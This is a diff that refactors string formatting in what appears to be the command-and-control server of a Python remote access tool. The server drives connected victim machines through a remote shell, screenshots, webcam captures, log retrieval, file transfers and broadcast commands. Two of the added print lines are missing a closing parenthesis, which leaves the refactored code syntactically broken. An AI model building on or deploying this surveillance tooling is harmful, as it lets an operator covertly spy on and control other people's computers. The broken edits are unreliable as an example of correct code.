@@ -66,15 +66,15 @@ def read_file(path, block_size=32768) -> bytes:
 def errors(ERROR, line=True) -> str:
     """ Error Handler """
     error_class = ERROR.__class__.__name__
-    error_msg = '%s:' % error_class
+    error_msg = f'{error_class}:'
     try:
-        error_msg += ' {0}'.format(ERROR.args[0])
+        error_msg += f' {ERROR.args[0]}'
     except Exception: pass
     if line:
         try:
             _, _, tb = sys.exc_info()
             line_number = traceback.extract_tb(tb)[-1][1]
-            error_msg += ' (line {0})'.format(line_number)
+            error_msg += f' (line {line_number})'
         except Exception: pass
     return error_msg
 
@@ -95,7 +95,7 @@ def shell_print(data) -> None:
 def _time() -> str:
     """ Get a filename from the current time """
     # returns str
-    return str(datetime.now()).replace(':','-')
+    return f"{datetime.now()}".replace(':','-')
 
 
 def json_dumps(data) -> bytes:
@@ -141,7 +141,7 @@ class Client(object):
         """ Send Buffer Size and Data to Client """
         # returns None
         encrypted = self.fer.encrypt(data)
-        self.conn.send(self.fer.encrypt(str(len(encrypted)).encode()))
+        self.conn.send(self.fer.encrypt(f"{len(encrypted)}".encode()))
         self.conn.recv(1024)
         self.conn.send(encrypted)
 
@@ -190,7 +190,7 @@ class Client(object):
         """ Transfer log to Server """
         # save_as: file name
         if not save_as:
-            save_as = '{}.log'.format(_time())
+            save_as = f'{_time()}.log'
         log = self.log_path()
         self.receive_file(log, save_as)
         return save_as
@@ -279,7 +279,7 @@ class Client(object):
         """ Take screenshot on Client """
         # returns True/False, None/error
         if not save_as:
-            save_as = '{}.png'.format(_time())
+            save_as = f'{_time()}.png'
         self.send(json_dumps(['SCREENSHOT']))
         data = self.receive()
         if data == b'ERROR':
@@ -293,7 +293,7 @@ class Client(object):
         """ Take a webcam shot """
         # returns True/False, save_as/None
         if not save_as:
-            save_as = 'webcam-{}.png'.format(_time())
+            save_as = f'webcam-{_time()}.png'
         self.send(json_dumps(['WEBCAM']))
         data = self.receive()
         if data == b'ERROR':
@@ -415,7 +415,7 @@ class MultiServer(object):
         try:
             self.socket = socket.socket()
         except socket.error as msg:
-            logging.error("Socket creation error: " + str(msg))
+            logging.error(f"Socket creation error: {msg}")
             # TODO: Added exit
             sys.exit(1)
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -428,7 +428,7 @@ class MultiServer(object):
             self.socket.bind((self.host, self.port))
             self.socket.listen(5)
         except socket.error as e:
-            logging.error("Socket binding error: " + str(e))
+            logging.error(f"Socket binding error: {e}")
             time.sleep(5)
             self.socket_bind()
         return
@@ -446,8 +446,9 @@ class MultiServer(object):
                 client = Client(conn, address, self.key)
                 self.clients.append(client)
                 if _print:
-                    msg = 'Connection has been established: {0} ({1})'.format(address[0], address[-1])
-                    print('\n{0}\n{1}\n{0}'.format('-' * len(msg), msg))
+                    msg = f'Connection has been established: {address[0]} ({address[-1]})'
+                    bar = len(msg)*'-'
+                    print(f'\n{bar}\n{msg}\n{bar}')
             except Exception as e:
                 logging.debug(errors(e))
 
@@ -486,7 +487,7 @@ class MultiServer(object):
         except (ValueError, IndexError):
             logging.error('Not a valid selection')
             return None
-        print("You are now connected to " + str(client.address[2]))
+        print(f"You are now connected to {client.address[2]}")
         return client
 
     def python_interpreter(self, client) -> None:
@@ -516,9 +517,9 @@ class MultiServer(object):
             cwd = client.get_cwd()
             if not system == 'Windows':
                 cwd = cwd.replace(home, '~')
-                _input = '{0}@{1}:{2}$ '.format(user, hostname, cwd)
+                _input = f'{user}@{hostname}:{cwd}$ '
             else:
-                _input = '{0}>'.format(cwd)
+                _input = f'{cwd}>'
 
             command = input(_input)
             if command.strip() == '':
@@ -553,7 +554,7 @@ class MultiServer(object):
             if result:
                 print('Saved Screenshot.')
             else:
-                print('Error Taking Screenshot: {}'.format(error.decode()))
+                print(f'Error Taking Screenshot: {error.decode()}')
             return
         if '--w' in command:
             print('Accessing webcam...')
@@ -590,7 +591,7 @@ class MultiServer(object):
         if '--l' in command:
             print('Transferring log...')
             log = client.get_log()
-            print('Log saved as: {}'.format(log))
+            print(f'Log saved as: {log}')
             return
         if '--s' in command:
             file_to_transfer = input('File to Transfer to Client: ')
@@ -600,7 +601,7 @@ class MultiServer(object):
             if result:
                 print('File transferred.')
             else:
-                print('Error transferring file: {}'.format(error))
+                print(f'Error transferring file: {error}')
             return
         if '--r' in command:
             file_to_transfer = input('File to Transfer to Server: ')
@@ -610,7 +611,7 @@ class MultiServer(object):
             if result:
                 print('File transferred.')
             else:
-                print('Error transferring file: {}'.format(error))
+                print(f'Error transferring file: {error}')
             return
         if '--d' in command:
             file_url = input('File URL: ')
@@ -724,7 +725,7 @@ class MultiServer(object):
         clients = self.clients[:]
         for client in clients:
             try:
-                print('Response from {0}:'.format(client.address[0]))
+                print(f'Response from {client.address[0]}:'
                 self.selector(client, command)
             except Exception as e:
                 print(errors(e))
@@ -734,7 +735,7 @@ class MultiServer(object):
         # returns None
         ip = client.address[0]
         while True:
-            command = input('{0}> '.format(ip))
+            command = input(f'{ip}> ')
             if self.selector(client, command):
                 break
 
@@ -759,7 +760,7 @@ class MultiServer(object):
                         except (EOFError, KeyboardInterrupt):
                             print()
                         except Exception as e:
-                            print('Connection lost: {}'.format(errors(e)))
+                            print(f'Connection lost: {errors(e)}'
                             self.del_client(client)
                             self.refresh_connections()
                     else:
